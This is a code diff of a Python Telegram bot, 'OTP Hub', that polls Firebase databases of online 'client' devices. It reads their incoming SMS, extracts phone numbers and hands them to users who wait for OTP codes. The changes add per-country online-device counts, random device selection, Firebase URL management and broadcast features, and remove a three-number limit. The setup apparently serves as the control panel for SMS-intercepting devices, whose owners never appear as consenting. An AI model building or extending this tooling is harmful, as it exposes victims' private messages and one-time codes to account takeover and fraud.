@@ -20,7 +20,7 @@ PORT = int(os.getenv("PORT", 8080))
 # =================================================
 
 router = Router()
-running_bots = {} # Store multiple bot instances
+running_bots = {} 
 
 # ================= DATA MANAGEMENT =================
 def load_data():
@@ -28,7 +28,7 @@ def load_data():
         default_data = {
             "owner_id": OWNER_ID,
             "admins": [],
-            "firebases": [], 
+            "firebases": [], # {"url": "...", "auth": "...", "label": "..."}
             "users": {},     
             "free_mode": True,
             "user_leases": {}, 
@@ -102,8 +102,24 @@ def extract_otp(text):
 class AdminStates(StatesGroup):
     select_country_add = State()
     add_fb = State()
+    add_admin = State()
+    broadcast = State()
 
 # ================= CORE FUNCTIONS =================
+async def get_live_device_counts():
+    data = load_data()
+    counts = {}
+    for fb in data.get("firebases", []):
+        clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+        online_count = 0
+        if clients and isinstance(clients, dict):
+            for dev_id, dev_data in clients.items():
+                if isinstance(dev_data, dict) and dev_data.get("status") is True:
+                    online_count += 1
+        label = fb['label']
+        counts[label] = counts.get(label, 0) + online_count
+    return counts
+
 async def get_available_numbers_for_country(country_label, uid):
     data = load_data()
     data = clean_old_history(data)
@@ -112,27 +128,35 @@ async def get_available_numbers_for_country(country_label, uid):
     valid_fbs = [f for f in data.get("firebases", []) if f["label"] == country_label]
     if not valid_fbs: return []
 
-    numbers = set()
+    # Find ALL online devices for this country
+    online_devices = []
     for fb in valid_fbs:
         clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
-        if not clients: continue
-        
-        for dev_id, dev_data in clients.items():
-            if isinstance(dev_data, dict) and dev_data.get("status") is True: 
-                msgs = await fetch_fb(f"{fb['url']}/messages/{dev_id}.json", fb.get("auth"))
-                if msgs:
-                    for k, v in msgs.items():
-                        if isinstance(v, dict) and v.get("type") == "incoming":
-                            body = v.get("message", "")
-                            nums = extract_numbers_from_msg(body)
-                            for n in nums: numbers.add(n)
-                    if numbers: break
-        if numbers: break
+        if clients:
+            for dev_id, dev_data in clients.items():
+                if isinstance(dev_data, dict) and dev_data.get("status") is True:
+                    online_devices.append((fb, dev_id))
+
+    if not online_devices:
+        return []
+
+    # Pick ONE random device from the online list
+    selected_fb, selected_dev_id = random.choice(online_devices)
+
+    # Fetch numbers ONLY from this one device
+    numbers = set()
+    msgs = await fetch_fb(f"{selected_fb['url']}/messages/{selected_dev_id}.json", selected_fb.get("auth"))
+    if msgs:
+        for k, v in msgs.items():
+            if isinstance(v, dict) and v.get("type") == "incoming":
+                body = v.get("message", "")
+                nums = extract_numbers_from_msg(body)
+                for n in nums: numbers.add(n)
                                 
     user_hist = data.get("user_history", {}).get(str(uid), {})
     available = [n for n in numbers if n not in user_hist]
     random.shuffle(available)
-    return available[:3]
+    return available
 
 async def get_latest_messages_for_fb(fb_url, auth):
     all_msgs = {}
@@ -227,10 +251,20 @@ def main_kb():
 def admin_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="👤 Enter as User (Test)", callback_data="user:home")],
-        [InlineKeyboardButton(text="➕ Add URL", callback_data="admin:addurl")],
-        [InlineKeyboardButton(text="🧹 Clean Dead URLs", callback_data="admin:clean")],
+        [InlineKeyboardButton(text="🔥 Manage Firebase", callback_data="admin:fb"), InlineKeyboardButton(text="👥 View Users", callback_data="admin:users")],
+        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast"), InlineKeyboardButton(text="👑 Manage Admins", callback_data="admin:admins")],
         [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
     ])
+
+def fb_menu_kb(data):
+    kb = []
+    # Show countries
+    countries = list(set([fb["label"] for fb in data.get("firebases", [])]))
+    for c in countries:
+        kb.append([InlineKeyboardButton(text=f"🌍 {c}", callback_data=f"admin:fbcountry:{c}")])
+    kb.append([InlineKeyboardButton(text="➕ Add URL", callback_data="admin:addurl")])
+    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
+    return InlineKeyboardMarkup(inline_keyboard=kb)
 
 # ================= HANDLERS =================
 @router.message(CommandStart())
@@ -243,35 +277,53 @@ async def cmd_start(msg: Message):
         save_data(data)
     
     if uid == data["owner_id"] or uid in data.get("admins", []):
-        try: await msg.answer("👑 <b>Admin Panel</b>", reply_markup=admin_kb(), parse_mode="HTML")
+        try: await msg.answer("👑 <b>Admin Panel</b>\nProcessing live stats...", parse_mode="HTML")
         except TelegramBadRequest: pass
+        await admin_home_msg(msg)
     else:
         if not data.get("free_mode", True):
             await msg.answer("⛔ Access Denied.")
             return
         await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
 
-@router.message(Command("add_bot"))
-async def cmd_add_bot(msg: Message):
-    if msg.from_user.id != OWNER_ID: return
-    parts = msg.text.split()
-    if len(parts) != 2: return await msg.answer("Usage: `/add_bot <token>`", parse_mode="Markdown")
-    new_token = parts[1]
-    
-    data = load_data()
-    if new_token not in data.setdefault("extra_tokens", []):
-        data["extra_tokens"].append(new_token)
-        save_data(data)
-        
-    if new_token not in running_bots:
-        await start_bot_instance(new_token)
-        await msg.answer("✅ Bot added and started in background!")
-    else:
-        await msg.answer("⚠️ Bot is already running.")
+async def admin_home_msg(msg: Message):
+    counts = await get_live_device_counts()
+    text = "👑 <b>Owner Panel</b>\n\n"
+    for label, count in counts.items():
+        text += f"🟢 {label}: {count} ONLINE\n"
+    text += "\nSelect an option:"
+    await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
 
 @router.callback_query(F.data == "admin:home")
-async def admin_home(cq: CallbackQuery):
-    try: await cq.message.edit_text("👑 <b>Admin Panel</b>", reply_markup=admin_kb(), parse_mode="HTML")
+async def admin_home_cb(cq: CallbackQuery):
+    await cq.message.edit_text("🔄 Refreshing live stats...")
+    counts = await get_live_device_counts()
+    text = "👑 <b>Owner Panel</b>\n\n"
+    for label, count in counts.items():
+        text += f"🟢 {label}: {count} ONLINE\n"
+    text += "\nSelect an option:"
+    try: await cq.message.edit_text(text, reply_markup=admin_kb(), parse_mode="HTML")
+    except TelegramBadRequest: pass
+
+@router.callback_query(F.data == "admin:fb")
+async def admin_fb(cq: CallbackQuery):
+    data = load_data()
+    try: await cq.message.edit_text("🔥 <b>Manage Countries / Firebases:</b>", reply_markup=fb_menu_kb(data), parse_mode="HTML")
+    except TelegramBadRequest: pass
+
+@router.callback_query(F.data.startswith("admin:fbcountry:"))
+async def admin_fbcountry(cq: CallbackQuery):
+    country = cq.data.split(":")[2]
+    data = load_data()
+    fbs = [f for f in data["firebases"] if f["label"] == country]
+    text = f"🌍 <b>{country}</b> URLs:\n\n"
+    kb = []
+    for f in fbs:
+        short_url = f['url'].split('//')[-1][:20]
+        text += f"• `{short_url}...`\n"
+        kb.append([InlineKeyboardButton(text=f"❌ Remove {short_url}", callback_data=f"admin:rmfb:{f['url']}")])
+    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:fb")])
+    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
     except TelegramBadRequest: pass
 
 @router.callback_query(F.data == "admin:addurl")
@@ -305,19 +357,14 @@ async def admin_addurl_done(msg: Message, state: FSMContext):
     try: await msg.answer(f"✅ URL added successfully for <b>{label}</b>!", reply_markup=admin_kb(), parse_mode="HTML")
     except TelegramBadRequest: pass
 
-@router.callback_query(F.data == "admin:clean")
-async def admin_clean(cq: CallbackQuery):
-    await cq.message.edit_text("🧹 Scanning and cleaning dead URLs...")
+@router.callback_query(F.data.startswith("admin:rmfb:"))
+async def admin_rmfb(cq: CallbackQuery):
+    url = cq.data.split("admin:rmfb:")[1]
     data = load_data()
-    valid_fbs, removed = [], 0
-    for fb in data["firebases"]:
-        clients = await fetch_fb(f"{fb['url']}/clients.json?shallow=true", fb.get("auth"))
-        if clients is not None: valid_fbs.append(fb)
-        else: removed += 1
-    data["firebases"] = valid_fbs
+    data["firebases"] = [f for f in data["firebases"] if f["url"] != url]
     save_data(data)
-    try: await cq.message.edit_text(f"✅ Cleaned! Removed {removed} dead URLs.\nTotal active: {len(valid_fbs)}", reply_markup=admin_kb())
-    except TelegramBadRequest: pass
+    await cq.answer("Removed!")
+    await admin_fb(cq)
 
 @router.callback_query(F.data == "user:home")
 async def user_home(cq: CallbackQuery):
@@ -349,7 +396,7 @@ async def user_country_selected(cq: CallbackQuery):
         return
         
     nums_text = "\n".join([f"<code>{n}</code>" for n in numbers])
-    text = f"📱 <b>Numbers Received</b>\nCountry: 🌍 {country}\nQty: {len(numbers)}/3\n\n{nums_text}\n\n⌛ <i>Waiting for OTP (1 Hour)...</i>"
+    text = f"📱 <b>Numbers Received</b>\nCountry: 🌍 {country}\nQty: {len(numbers)}\n\n{nums_text}\n\n⌛ <i>Waiting for OTP (1 Hour)...</i>"
     
     data = load_data()
     data["user_leases"][str(uid)] = {"numbers": numbers, "country": country, "expire_at": int(time.time()) + 3600}
@@ -375,29 +422,16 @@ async def user_account(cq: CallbackQuery):
     try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
     except TelegramBadRequest: pass
 
-async def start_bot_instance(token: str):
-    bot = Bot(token=token)
-    dp = Dispatcher(storage=MemoryStorage())
-    dp.include_router(router)
-    running_bots[token] = (bot, dp)
-    asyncio.create_task(dp.start_polling(bot))
-
 async def main():
     log.info("Bot Started!")
-    await web_server() # Start web server so Render keeps it alive
+    await web_server() 
     
     main_bot = Bot(token=BOT_TOKEN)
     asyncio.create_task(background_global_scanner(main_bot))
     
-    # Load all bots
-    await start_bot_instance(BOT_TOKEN)
-    data = load_data()
-    for tok in data.get("extra_tokens", []):
-        await start_bot_instance(tok)
-        
-    # THIS IS WHAT KEEPS THE APP RUNNING 24/7
-    while True:
-        await asyncio.sleep(3600)
+    dp = Dispatcher(storage=MemoryStorage())
+    dp.include_router(router)
+    await dp.start_polling(main_bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
